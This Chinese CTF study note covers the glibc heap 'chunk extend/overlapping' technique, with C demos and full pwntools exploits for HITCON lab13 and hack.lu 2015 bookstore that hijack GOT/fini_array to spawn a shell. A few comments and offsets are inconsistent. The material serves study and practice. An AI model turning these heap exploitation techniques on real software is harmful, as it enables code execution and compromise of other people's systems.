# Chunk Extend and Overlapping

## 介绍

1. chunk extend 是堆漏洞的一种常见利用手法，通过 **extend** 可以实现 **chunk overlapping** 的效果。这种利用方法需要以下的时机和条件：
   * 程序中存在基于堆的漏洞。
   * 漏洞可以**控制 chunk header 中的数据** 。（伪造chunk header）

## 原理：

1. chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时**使用的各种宏**。在 ptmalloc 中，获取 chunk 块大小的操作如下：

   ```c
   /* Get size, ignoring use bits */
   #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS))
   
   /* Like chunksize, but do not mask SIZE_BITS.  */
   #define chunksize_nomask(p) ((p)->mchunk_size)
   ```

   一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。

   1. 在 ptmalloc 中，**获取下一 chunk 块地址** （高地址）的操作如下，即使用当前块**指针加上当前块**大小。：

   ```c
   /* Ptr to next physical malloc_chunk. */
   #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))
   ```

   2. 在 ptmalloc 中，获取**前一个 chunk 信息** （低地址）的操作如下，即通过 **malloc_chunk->prev_size 获取前一块** （低地址）大小，然后使用本 chunk 地址减去所得大小：

   ```c
   /* Size of the chunk below P.  Only valid if prev_inuse (P).  */
   #define prev_size(p) ((p)->mchunk_prev_size)
   
   /* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */
   #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))
   ```

   3. 在 ptmalloc，判断当前 chunk **是否是 use 状态**的操作如下：

   ```c
   #define inuse(p)
       ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE)
   ```

   即查看**下一 chunk 的 prev_inuse 域**，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。

   

2. 通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据**判断 chunk 的使用情况**和对 chunk 的前后块进行定位。简而言之，**chunk extend** 就是通过 **控制 size 和 pre_size 域** 来实现**跨越块操作**从而导致 overlapping （重叠）的。

## 基本示例 1：对 inuse 的 fastbin 进行 extend

1. 简单来说，该利用的效果是通过 **更改第一个块的大小** 来控制第二个块的内容，**注意，我们的示例都是在 64 位的程序：

   ```c
   int main(void)
   {
       void *ptr,*ptr1;
   
       ptr=malloc(0x10);//分配第一个0x10的chunk
       malloc(0x10);//分配第二个0x10的chunk
   
       *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域
   
       free(ptr);
       ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容
       return 0;
   }
   ```

   当两个 malloc 语句执行之后，堆的内存分布如下:

   ![image-20240716104413120](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407161044367.png)

   之后，我们把 **chunk1 的 size 域更改为 0x41**，0x41 是因为 chunk 的 size 域**包含了用户控制的大小和 header 的大小**。如上所示正好大小为 0x40。在**题目中这一步可以由堆溢出**得到：

   ![image-20240716104534534](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407161045733.png)

   执行 free 之后，我们可以看到 **chunk2 与 chunk1 合成一个 0x40** 大小的 chunk，一起释放了。

   ![image-20240716104651254](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407161046471.png)

   之后我们通过 malloc(0x30) 得到 **chunk1+chunk2 的块**，此时就可以**直接控制 chunk2 中的内容**，我们也把这种状态称为 **overlapping chunk**：

   ![image-20240716104836882](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407161048059.png)

## 基本示例 2：对 inuse 的 smallbin 进行 extend

1. 通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而**不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中**。 以下这个示例中，我们使用 **0x80 这个大小来分配堆**（作为对比，fastbin 默认的最大的 chunk 可使用范围是 0x70（申请的大小，不是size的值））：

   ```c
   int main()
   {
       void *ptr,*ptr1;
   
       ptr=malloc(0x80);//分配第一个 0x80 的chunk1
       malloc(0x10); //分配第二个 0x10 的chunk2
       malloc(0x10); //防止与top chunk合并
   
       *(int *)((int)ptr-0x8)=0xb1;
       free(ptr);
       ptr1=malloc(0xa0);
   }
   ```

   在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会**导致和 top chunk 合并**。所以我们需要额外分配一个 chunk，把**释放的块与 top chunk 隔开**。：
   
   ![image-20240716111144568](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407161113601.png)
   
   篡改后：
   
   ![	](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407161113601.png)
   
   释放后，**chunk1 把 chunk2 的内容吞并掉**并一起置入 **unsorted bin**：
   
   ![image-20240716111502618](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407161115099.png)
   
   再次进行分配的时候就会**取回 chunk1 和 chunk2 的空间**，此时我们就可以**控制 chunk2 中的内容**：
   
   ![image-20240716111535994](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407161115403.png)



## 基本示例 3：对 free 的 smallbin 进行 extend

1. 示例 3 是在示例 2 的基础上进行的，这次我们**先释放 chunk1**，然后**再修改处于 unsorted bin 中的 chunk1 的 size** 域。：

   ```c
   #include <stdio.h>
   #include <stdlib.h>
   int main()
   {
       void *ptr,*ptr1;
   
       ptr=malloc(0x80);//分配第一个 0x80 的chunk1
       malloc(0x10); //分配第二个 0x10 的chunk2
   
       free(ptr);
       *(long long *)((long long)ptr-0x8)=0xb1;
       
       ptr1=malloc(0xa0);
   }
   ```

   两次 malloc 之后的结果如下：

   ![image-20240716112033933](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407161120719.png)

   我们首**先释放 chunk1 使它进入 unsorted bin** 中：

   ![image-20240716112102663](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407161121003.png)

   然后篡改 chunk1 的 size 域：

   ![image-20240716112129036](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407161121370.png)

   此时再进行 malloc 分配就可以**得到 chunk1+chunk2 的堆**块，从而**控制了 chunk2 的内容** ：

   ![image-20240716112209049](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407161122357.png)

## Chunk Extend/Shrink 可以做什么

1. 一般来说，这种技术并不能直接控制程序的执行流程，但是可以**控制 chunk 中的内容**。如果 **chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程**。
2. 此外通过 extend 可以实现 **chunk overlapping**，通过 **overlapping 可以控制 chunk 的 fd/bk 指针**从而可以实现 fastbin attack 等利用。



## 基本示例 4：通过 extend 后向 overlapping

1. 这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用：

   ```c
   int main()
   {
       void *ptr,*ptr1;
   
       ptr=malloc(0x10);//分配第1个 0x80 的chunk1
       malloc(0x10); //分配第2个 0x10 的chunk2
       malloc(0x10); //分配第3个 0x10 的chunk3
       malloc(0x10); //分配第4个 0x10 的chunk4    
       *(long long *)((long long)ptr-0x8)=0x61;//修改size值
       free(ptr);
       ptr1=malloc(0x50);
   }
   ```

   在 malloc(0x50) 对 extend 区域重新占位后，其中 **0x10 的 fastbin 块依然可以正常的分配和释放**，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。

## 基本示例 5：通过 extend 前向 overlapping

1. 这里展示通过**修改 pre_inuse** 域和 **pre_size 域**实现**合并前面的块** :

   ```c
   int main(void)
   {
       void *ptr1,*ptr2,*ptr3,*ptr4;
       ptr1=malloc(128);//smallbin1
       ptr2=malloc(0x10);//fastbin1
       ptr3=malloc(0x10);//fastbin2
       ptr4=malloc(128);//smallbin2
       malloc(0x10);//防止与top合并
       free(ptr1);
       *(long long *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域
       *(long long *)((long long)ptr4-0x10)=0xd0;//修改pre_size域
       free(ptr4);//unlink进行前向extend
       malloc(0x150);//占位块
   
   }
   ```

   前向 extend 利用了 **smallbin 的 unlink 机制**，通过**修改 pre_size 域**可以**跨越多个 chunk 进行合并**实现 overlapping。



## 例题：HITCON Training lab13

### 思路：

1. 申请两个堆，通过off_by_one伪造size大小，释放后再申请，造成overlaping。
2. 后续可以任意地址读写。

### 利用：

1. EXP：

   ```python
   #!/usr/bin/env python
   # -*- coding: utf-8 -*-
   
   from pwn import *
   
   r = process('./heapcreator')
   heap = ELF('./heapcreator')
   libc = ELF('./libc.so.6')
   
   
   def create(size, content):
       r.recvuntil(":")
       r.sendline("1")
       r.recvuntil(":")
       r.sendline(str(size))
       r.recvuntil(":")
       r.sendline(content)
   
   
   def edit(idx, content):
       r.recvuntil(":")
       r.sendline("2")
       r.recvuntil(":")
       r.sendline(str(idx))
       r.recvuntil(":")
       r.sendline(content)
   
   
   def show(idx):
       r.recvuntil(":")
       r.sendline("3")
       r.recvuntil(":")
       r.sendline(str(idx))
   
   
   def delete(idx):
       r.recvuntil(":")
       r.sendline("4")
       r.recvuntil(":")
       r.sendline(str(idx))
   
   
   free_got = 0x602018
   create(0x18, "dada")  # 0
   create(0x10, "ddaa")  # 1
   # overwrite heap 1's struct's size to 0x41
   edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")
   # trigger heap 1's struct to fastbin 0x40
   # heap 1's content to fastbin 0x20
   delete(1)
   # new heap 1's struct will point to old heap 1's content, size 0x20
   # new heap 1's content will point to old heap 1's struct, size 0x30
   # that is to say we can overwrite new heap 1's struct
   # here we overwrite its heap content pointer to free@got
   create(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))  #1
   # leak freeaddr
   show(1)
   r.recvuntil("Content : ")
   data = r.recvuntil("Done !")
   
   free_addr = u64(data.split("\n")[0].ljust(8, "\x00"))
   libc_base = free_addr - libc.symbols['free']
   log.success('libc base addr: ' + hex(libc_base))
   system_addr = libc_base + libc.symbols['system']
   #gdb.attach(r)
   # overwrite free@got with system addr
   edit(1, p64(system_addr))
   # trigger system("/bin/sh")
   delete(0)
   r.interactive()
   ```





## 2015 hacklu bookstore

### 知识点：

1. 挟持**_fini_array**中的指针，控制程序的执行流：

   ![image-20240717222314691](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407172223755.png)

   ![image-20240717222259535](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407172222643.png)

2. 执行的流程是 ：**fini_array[1] ==> fini_array[0]** ,可以覆盖着两个指针来挟持程序的控制流。

3. 程序的正常执行流程：**start ==> __libc_start_main ==> main ==> other_fun** :

   **start**函数：

   ![image-20240718101912648](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181019243.png)

   **__libc_start_main** 函数：

   ![image-20240718102137242](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181021828.png)

   **main**函数：

   ![image-20240718102521380](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181025815.png)


### 思路：

1. extend chunk造成overlap，利用格式化字符串实现任意地址读写。
2. **前后两次返回值**修改：
   * 第一次：**修改fini_array中的地址**，使得程序第一次执行完后能再次执行main函数。
   * 第二次：**修改main函数返回值地址**，借助第一次泄漏的栈地址，计算其到main函数返回值的偏移，用one_gadget地址覆盖掉。

### 分析：

1. 程序执行生成了3个chunk：

   ![image-20240717182502416](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407171825503.png)

2. 只能修改和删除其中两个chunk，修改时存在堆溢出：

   ![image-20240717182552238](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407171825322.png)

   ![image-20240717182612676](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407171826750.png)

3. 最后又一个格式化字符串的漏洞，只有这个漏洞能实现任意地址读写，所以主要利用这个漏洞：

   ![image-20240717182714407](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407171827467.png)

4. 但是格式化字符串不能直接修改，但是dest格式化字符串在堆上，而且在book2的后面，所以可以考虑**修改dest的size字段为0x151**，在**submit时会重新申请到修改的chunk**，**实现overlaping**，这样就能控制dest的值了。

### 利用：

1. 先利用chunk1堆溢出修改chunk的size字段为0x151，再free掉：

   ```python
   payload1 = b"a"*0x88+p64(0x151)
   edit(1,payload1)
   free(4)
   ```



2. 构造格式化字符串，泄漏put函数got表值计算libc基地址，泄漏第二次的**main函数返回值存放的地址**：

   ```python
   payload1 = b'%2617c%13$hn'  #修改返回地址，再次进入main函数
   payload1 += b".%14$s"       #泄漏libc
   payload1 += b",%32$p"       #泄漏第二次的main函数返回值存放的地址
   payload1 += b"M"*(0x74-len(payload1))
   edit(1,payload1)
   
   # 改变fini_array的值,再次执行程序
   payload3 = b'5'+b'a'*7 + p64(fini_addr) + p64(elf.got["puts"])    #这里是为了在栈上写入.fini_array的地址,再格式化字符串栈上的第13个位置
   submit(payload3)
   
   addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
   success("puts_addr==>"+hex(addr))
   libc_base = addr - libc.symbols["puts"]
   success("libc_base==>"+hex(libc_base))
   one_gadget_addr = libc_base + one_gadget
   success("one_gadget_addr==>"+hex(one_gadget_addr))
   
   p.recvuntil(b",0x")
   ret_addr = int(p.recv()[0:12],16)-0xf8	#调试后计算他们之间的相对偏移
   success("ret_addr==>"+hex(ret_addr))
   ```

3. 再次利用格式化字符串，修改main函数返回值到one_gadget（和原本的值，只有低3个字节不一样，分两次写即可）:

   ```python
   payload1 = b"a"*0x88+p64(0x151)
   p.sendline(b"1")
   p.sendlineafter(b':\n',payload1)
   free(4)
   
   one_gadget_addr2 = (((one_gadget_addr>>8)&0xffff) - (one_gadget_addr&0xff))
   success("one_gadget_addr2==>"+hex(one_gadget_addr2))
   
   payload1 = b'%' + int.to_bytes(one_gadget_addr&0xff) +b"c%13hhn%" + str(one_gadget_addr2).encode() +b"c%14hn"
   payload1 += b"M"*(0x74-len(payload1))
   edit(1,payload1)
   
   
   payload3 = b'5'+b'\x00'*7 + p64(ret_addr) + p64(ret_addr+1)    #这里修改main函数的返回地址指向onegadget
   submit(payload3)
   
   # p.sendline(b"cat flag")
   p.interactive()
   ```

   ![image-20240717204519649](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407172045887.png)

4. 完整EXP：

   ```py
   from pwn import *
   context(os='linux', arch='i386', log_level='debug')
   
   def debug():
       print(proc.pidof(p))
       pause()
   
   # p = remote("node4.anna.nssctf.cn",28343)
   p = process("./pwn") 
   libc = ELF('/home/kali/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
   elf = ELF("./pwn")
   
   def edit(index,content):
       p.sendlineafter(b't\n',str(index).encode())
       p.sendlineafter(b':\n',content)
   
   def free(index):
       p.sendlineafter(b't\n',str(index).encode())
   
   def submit(payload):
       p.sendlineafter(b't\n',payload)
   one=[0x4f2be,0x4f2c5,0x4f322,0x10a38c]
   
   one_gadget = one[3]
   #   
   main_addr = 0x400a39
   fini_addr = 0x6011b8                #内容为0x400830
   
   payload1 = b"a"*0x88+p64(0x151)
   edit(1,payload1)
   free(4)
   
   payload1 = b'%2617c%13$hn' 
   payload1 += b".%14$s"       #泄漏libc
   payload1 += b",%33$p"       #泄漏第二次的main函数返回值存放的地址
   payload1 += b"M"*(0x74-len(payload1))
   edit(1,payload1)
   
   # 改变fini_array的值,再次执行程序
   __libc_start_main = libc.sym["__libc_start_main"]
   success("__libc_start_main==>"+hex(__libc_start_main))
   debug()
   payload3 = b'5'+b'a'*7 + p64(fini_addr) + p64(elf.got["puts"])    #这里是为了在栈上写入.fini_array的地址,再格式化字符串栈上的第13个位置
   submit(payload3)
   
   
   addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
   success("puts_addr==>"+hex(addr))
   libc_base = addr - libc.symbols["puts"]
   success("libc_base==>"+hex(libc_base))
   one_gadget_addr = libc_base + one_gadget
   success("one_gadget_addr==>"+hex(one_gadget_addr))
   
   
   p.recvuntil(b",0x")
   ret_addr = int(p.recv()[0:12],16)-0xe0
   success("ret_addr==>"+hex(ret_addr))
   # 
   #==============second==============
   # 
   # p.sendline(b"4")
   payload1 = b"a"*0x88+p64(0x151)
   p.sendline(b"1")
   p.sendlineafter(b':\n',payload1)
   free(4)
   
   
   one_gadget_addr2 = (((one_gadget_addr>>8)&0xffff) - (one_gadget_addr&0xff))
   success("one_gadget_addr2==>"+hex(one_gadget_addr2))
   
   payload1 = b'%' + int.to_bytes(one_gadget_addr&0xff) +b"c%13hhn%" + str(one_gadget_addr2).encode() +b"c%14hn"
   payload1 += b"M"*(0x74-len(payload1))
   edit(1,payload1)
   
   payload3 = b'5'+b'\x00'*7 + p64(ret_addr) + p64(ret_addr+1)    #这里修改main函数的返回地址指向onegadget
   submit(payload3)
   
   # p.sendline(b"cat flag")
   p.interactive()
   ```

   